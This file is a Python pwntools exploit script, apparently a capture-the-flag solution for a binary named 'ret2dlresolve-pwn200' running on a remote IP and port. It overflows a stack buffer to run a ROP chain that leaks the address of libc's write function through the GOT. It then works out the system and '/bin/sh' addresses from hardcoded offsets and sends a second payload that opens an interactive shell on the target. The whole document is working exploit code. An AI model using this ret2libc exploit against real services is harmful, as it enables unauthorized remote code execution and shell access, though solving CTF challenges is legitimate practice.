from pwn import *
from LibcSearcher3 import *

#io = process('./ret2dlresolve-pwn200')
io = remote('210.30.97.133',28083)
#io = remote('ephemerally.top',28081)
elf = ELF('./ret2dlresolve-pwn200')
context.log_level = 'debug'
#raw_input('>')

write_plt = elf.plt['write']
write_got = elf.got['write']
backdoor_ebp = 0xffffd3e8
backdoor_addr = 0x08048484

payload = b'a' * 0x6c + p32(backdoor_ebp)
payload += p32(write_plt) + p32(backdoor_addr) + p32(1) + p32(write_got) + p32(4)
io.recvuntil(b'2015~!\n')
io.send(payload)

write_addr = u32(io.recv(4))
io.success('write_addr: ' + hex(write_addr))
#libc = LibcSearcher('write',write_addr)
#libc_base = write_addr - libc.dump('write')
#system_addr = libc_base + libc.dump('system')
#bin_sh_addr = libc_base + libc.dump('str_bin_sh')
libc_base = write_addr - 0x0d44d0
system_addr = libc_base + 0x03a950
bin_sh_addr = libc_base + 0x15912b
io.success('system_addr: ' + hex(system_addr))
io.success('bin_sh_addr: ' + hex(bin_sh_addr))

raw_input('>')
payload2 = b'a' * 0x6c + b'b' * 0x4
payload2 += p32(system_addr) + p32(backdoor_addr) + p32(bin_sh_addr)

io.send(payload2)

io.interactive()
